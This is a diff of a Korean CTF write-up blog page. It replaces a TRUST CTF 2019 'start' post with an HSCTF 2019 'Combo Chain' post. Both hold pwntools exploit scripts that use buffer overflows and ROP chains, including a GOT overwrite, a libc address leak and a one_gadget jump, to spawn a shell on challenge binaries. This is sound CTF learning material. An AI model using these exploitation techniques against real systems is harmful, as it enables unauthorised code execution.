@@ -14,26 +14,26 @@
     
 
     
-    <title>TRUST CTF 2019 start | j0n9hyun</title>
+    <title>HSCTF 2019 Combo Chain | j0n9hyun</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
         <meta name="keywords" content="CTF">
     
-    <meta name="description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  1234567">
+    <meta name="description" content="Combo Chain Binary File 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = process(&apos;./combo-chain&apos;)e = ELF(&apos;./combo-chain&apos;)libc = e.libcru = lambda a: r.recvu">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TRUST CTF 2019 start">
-<meta property="og:url" content="http://j0n9hyun.github.io/2019/02/15/pwnstart/index.html">
+<meta property="og:title" content="HSCTF 2019 Combo Chain">
+<meta property="og:url" content="http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  1234567">
+<meta property="og:description" content="Combo Chain Binary File 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = process(&apos;./combo-chain&apos;)e = ELF(&apos;./combo-chain&apos;)libc = e.libcru = lambda a: r.recvu">
 <meta property="og:locale" content="ko">
-<meta property="og:updated_time" content="2019-05-24T13:15:03.107Z">
+<meta property="og:updated_time" content="2019-06-08T22:48:55.232Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="TRUST CTF 2019 start">
-<meta name="twitter:description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  1234567">
+<meta name="twitter:title" content="HSCTF 2019 Combo Chain">
+<meta name="twitter:description" content="Combo Chain Binary File 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = process(&apos;./combo-chain&apos;)e = ELF(&apos;./combo-chain&apos;)libc = e.libcru = lambda a: r.recvu">
     
-	<link rel="canonical" href="http://j0n9hyun.github.io/2019/02/15/pwnstart/">
+	<link rel="canonical" href="http://j0n9hyun.github.io/2019/06/09/hsctf-2019-combo-chain/">
 
     
 
@@ -150,14 +150,14 @@
 </div>
 
                         <div class="main-body-content">
-                            <article id="post-pwnstart" class="article article-single article-type-post" itemscope itemprop="blogPost">
+                            <article id="post-HSCTF-2019-Combo-Chain" class="article article-single article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        TRUST CTF 2019 start
+        HSCTF 2019 Combo Chain
         </h1>
     
 
@@ -167,8 +167,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2019/02/15/pwnstart/" class="article-date">
-            <time datetime="2019-02-15T05:40:00.000Z" itemprop="datePublished">2019-02-15</time>
+        <a href="/2019/06/09/HSCTF-2019-Combo-Chain/" class="article-date">
+            <time datetime="2019-06-08T22:28:42.000Z" itemprop="datePublished">2019-06-09</time>
         </a>
     </div>
 
@@ -180,30 +180,14 @@
         <a class="tag-link" href="/tags/CTF/">CTF</a>
     </div>
 
-  			<span class="reading-time">⏱ 3 분</span>
+  			<span class="reading-time">⏱ 2 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
-            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h2>
-<p><a href="/j0n9hyun.github.io/upload/start.zip">Binary File</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_4005E6 proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">pop     rax</span><br><span class="line">pop     rdx</span><br><span class="line">pop     rdi</span><br><span class="line">pop     rsi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
-<center><small>[sub_4005E6]</small></center>
-4개의 sub 함수 중 4005E6에는 pop gadget이 있다. <br>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x78</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<center><small>[main]</small></center>
-바이너리 파일을 뜯어보면 sub로 시작하는 함수 4개와 메인함수가 있다.  
-언뜻봐도 알 수 있듯이 read 함수에서 BOF 취약점이 터지는 것을 확인할 수 있다.  
-보통은 write 같은 함수가 주어져야 하는데 read 함수밖에 없는 걸로 보아 일반적으로 하는 ROP 기법은 사용할 수 없다. 그래서 같이 주어져 있는 libc 파일에서 syscall 가젯을 사용한다.  
-주소값의 하위 3비트는 고정적인 값을 지니고 있기 때문에 read의 libc 주소 1 바이트를 syscall의 하위 1 바이트 주소로 바꿔서 보내면 된다. <br>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote('server.trustctf.com', 10392)</span></span><br><span class="line">r = process(<span class="string">'./start'</span>)</span><br><span class="line">e = ELF(<span class="string">'./start'</span>)</span><br><span class="line">pr = <span class="number">0x4005ed</span> <span class="comment"># pop rsi</span></span><br><span class="line">ppppr = <span class="number">0x4005ea</span> <span class="comment"># pop rax,rdx,rdi,rsi</span></span><br><span class="line">cmd = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">syscall = <span class="string">"\x7b"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.got[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.send(syscall)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<center><small>[Exploit Code]</small></center>
-<style>
-  img.border-shadow{
-      border:1px solid #888888;
-      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-  }
-</style>
+            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="combo-chain"><a class="markdownIt-Anchor" href="#combo-chain"></a> Combo Chain</h3>
+<p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3268976/combo-chain.zip" target="_blank" rel="noopener"><strong>Binary File</strong></a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./combo-chain'</span>)</span><br><span class="line">e = ELF(<span class="string">'./combo-chain'</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_offset = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">gets_got = e.got[<span class="string">'gets'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000401263</span></span><br><span class="line">nop = <span class="number">0x000000000040114f</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(gets_got)</span><br><span class="line">p += p64(nop)</span><br><span class="line">p += p64(printf_plt)</span><br><span class="line">p += p64(main)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - gets_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>
 
         </div>
         <footer class="article-footer">
@@ -211,7 +195,7 @@
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/02/15/pwnstart/" data-id="cjwo3rsya001mb1fp21zsv7a9" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/" data-id="cjwo3rsxb0000b1fpfnnj0s9q" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -281,21 +265,18 @@
             "@type": "Person",
             "name": "j0n9hyun"
         },
-        "headline": "TRUST CTF 2019 start",
+        "headline": "HSCTF 2019 Combo Chain",
         "image": "http://j0n9hyun.github.io",
         "keywords": "CTF",
         "genre": "WriteUps Pwn",
-        "datePublished": "2019-02-15",
-        "dateCreated": "2019-02-15",
-        "dateModified": "2019-05-24",
-        "url": "http://j0n9hyun.github.io/2019/02/15/pwnstart/",
-        "description": " start
+        "datePublished": "2019-06-09",
+        "dateCreated": "2019-06-09",
+        "dateModified": "2019-06-09",
+        "url": "http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/",
+        "description": " Combo Chain
 Binary File
-123456789sub_4005E6 proc near; __unwind &#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn
-[sub_4005E6]
-4개의 sub 함수 중 4005E6에는 pop gadget이 있다. 
-1234567"
-        "wordCount": 393
+12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = process('./combo-chain')e = ELF('./combo-chain')libc = e.libcru = lambda a: r.recvu"
+        "wordCount": 214
     }
 </script>
 
@@ -343,20 +324,10 @@ Binary File
         
 <nav id="article-nav">
     
-        <a href="/2019/02/18/r0pbaby/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">다음 글</strong>
-        <p class="article-nav-title">
-        
-            DEFCON 2015 r0pbaby
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2019/02/15/trust1st/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2019/05/31/How2Heap-Poison-null-byte/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">이전 글</strong>
-        <p class="article-nav-title">디미고 TRUST CTF 2019 1등</p>
+        <p class="article-nav-title">[How2Heap] Poison_null_byte</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -466,7 +437,7 @@ Binary File
     var disqus_shortname = 'j0n9hyun';
     
     
-    var disqus_url = 'http://j0n9hyun.github.io/2019/02/15/pwnstart/';
+    var disqus_url = 'http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/';
     
     (function() {
     var dsq = document.createElement('script');
